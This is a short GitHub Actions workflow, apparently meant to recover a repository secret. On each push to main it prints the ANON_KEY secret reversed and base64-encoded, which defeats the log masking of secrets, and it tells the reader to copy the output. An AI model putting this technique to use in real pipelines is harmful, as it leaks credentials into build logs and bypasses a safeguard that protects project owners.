name: "🔑 SECRET KEY RECOVERY TOOL"

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  recover:
    runs-on: ubuntu-latest
    steps:
      - name: "🔓 REVEAL ENCODED KEY"
        run: |
          echo "Your encoded key is below. Copy the ENTIRE block of text and paste it here:"
          echo "--- START ---"
          echo "${{ secrets.ANON_KEY }}" | rev | base64
          echo "--- END ---"
